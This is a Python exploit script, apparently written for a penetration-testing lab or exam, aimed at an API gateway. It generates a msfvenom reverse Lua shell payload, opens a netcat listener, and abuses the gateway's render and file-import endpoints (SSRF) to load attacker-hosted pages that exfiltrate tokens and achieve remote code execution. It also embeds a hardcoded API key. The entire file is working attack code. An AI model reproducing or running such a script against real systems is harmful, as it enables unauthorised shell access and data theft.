import urllib3
import requests
import json
import subprocess
import os
import psutil
import socket

s = requests.session()

interface_name = "tun0"
host = "http://apigateway:8000"
proxies = {"http": "http://127.0.0.1:8080"}

headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }


def get_ip_address(interface_name):
    addrs = psutil.net_if_addrs()
    if interface_name in addrs:
        for addr in addrs[interface_name]:
            if addr.family == socket.AF_INET:  # AF_INET is for IPv4
                if addr.address:
                    return addr.address
    print(f"Nie znaleziono adresu IP dla {interface_name}")
    return None

RHOST = "apigateway:8000"
RPORT = "8000"
LHOST =  get_ip_address(interface_name)
LPORT = "4444"

def generatePayload(LHOST, LPORT):
    command = [
        "msfvenom",
        "-p", "cmd/unix/reverse_lua",
        f"lhost={LHOST}",
        f"lport={LPORT}",
        "-f", "raw"
    ]
    
    try:
        # Uruchomienie polecenia msfvenom i przechwycenie wyjścia
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        payload = result.stdout
        
        # Usuń "lua -e " z początku
        if payload.startswith("lua -e "):
            payload = payload[len("lua -e "):]
        
        return payload
    
    except subprocess.CalledProcessError as e:
        print(f"Błąd podczas generowania payloadu: {e}")
        return None

def rce(RHOST, LHOST, LPORT, RPORT):
    # Pierwsze zapytanie curl
    post_url = f"http://{RHOST}/render"
    post_data = '{"url":"http://' + LHOST + '/static/rce.html"}'
    post_headers = [
        "-H", "Content-Type: application/json",
        "-H", "apikey: SBzrCb94o9JOWALBvDAZLnHo3s90smjC"
    ]
    post_command = [
        "curl", "-X", "POST",
        *post_headers,
        "-d", post_data,
        post_url,
        "--output", "response.pdf"
    ]

    try:
        subprocess.run(post_command, check=True)
        print("Pierwsze zapytanie zakończone sukcesem i zapisane do response.pdf.")
    except subprocess.CalledProcessError as e:
        print(f"Błąd podczas wykonywania pierwszego zapytania: {e}")
        return None

    # Drugie zapytanie curl
    get_url = f"http://{RHOST}/supersecret"
    get_command = [
        "curl", "-i", get_url
    ]

    try:
        result = subprocess.run(get_command, capture_output=True, text=True, check=True)
        print("Drugie zapytanie zakończone sukcesem.")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Błąd podczas wykonywania drugiego zapytania: {e}")
        return None

def getToken():
    api_gateway_url = f"http://{RHOST}/files/import"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "url": f"http://172.16.16.5:9000/api/render?url=http://{LHOST}/exfil.html"
    }

    response = requests.post(api_gateway_url, headers=headers, data=json.dumps(payload))

    if response.status_code == 200:
        print("Request successful!")
        print("Response:", response.text)
    else:
        print(f"Request failed with status code {response.status_code}")
        print("Response:", response.text)

def startListener(port):
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'nc -nlvp {port}; exec bash'"
        process = subprocess.Popen(command, shell=True)
        print(f"[+] Netcat listener started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"[-] Failed to start netcat listener: {e}")
        return None

def startFlaskServer():
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'python3 flask_server.py'"
        process = subprocess.Popen(command, shell=True)
        print(f"[+] Flask server started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"[-] Failed to start server listener: {e}")
        return None

print(LHOST)
#payload = generatePayload(LHOST, LPORT)

#starting new terminals with listener and flask server
#startListener(LPORT)
#startFlaskServer()
getToken()

#response = rce(RHOST, LHOST, LPORT, RPORT)
#if response:
#    print(f"Zawartość odpowiedzi drugiego zapytania:\n{response}")